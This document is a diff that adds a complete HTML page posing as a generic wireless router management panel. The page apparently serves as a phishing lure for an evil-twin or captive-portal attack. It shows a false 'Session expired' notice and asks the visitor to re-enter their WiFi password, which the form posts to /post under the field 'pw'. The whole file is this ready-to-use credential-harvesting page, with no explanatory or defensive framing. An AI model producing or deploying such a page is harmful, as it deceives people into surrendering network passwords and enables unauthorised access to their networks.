@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Wireless Router</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .router-box {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            overflow: hidden;
+            border: 1px solid #ccc;
+        }
+        .header {
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .header h2 {
+            margin: 0;
+            font-size: 20px;
+            letter-spacing: 1px;
+        }
+        .header p {
+            margin: 5px 0 0;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        .content {
+            padding: 30px;
+        }
+        .alert-box {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .input-label {
+            display: block;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            height: 45px;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .btn {
+            background: #2c3e50;
+            color: white;
+            border: none;
+            width: 100%;
+            height: 45px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #1a252f;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 11px;
+            color: #aaa;
+            background: #f9f9f9;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+    <div class="router-box">
+        <div class="header">
+            <h2>WIRELESS ROUTER</h2>
+            <p>Network Security Management</p>
+        </div>
+        <div class="content">
+            <div class="alert-box">
+                <strong>Notice:</strong> Session expired. Please re-enter your WiFi password to reconnect.
+            </div>
+            <label class="input-label">WiFi Password</label>
+            <form action="/post" method="POST">
+                <input type="password" name="pw" placeholder="Enter WiFi Password" required autofocus>
+                <button type="submit" class="btn">Continue</button>
+            </form>
+        </div>
+        <div class="footer">
+            &copy; 2026 RouterOS Wireless Panel v4.2.1<br>
+            All rights reserved.
+        </div>
+    </div>
+</body>
+</html>
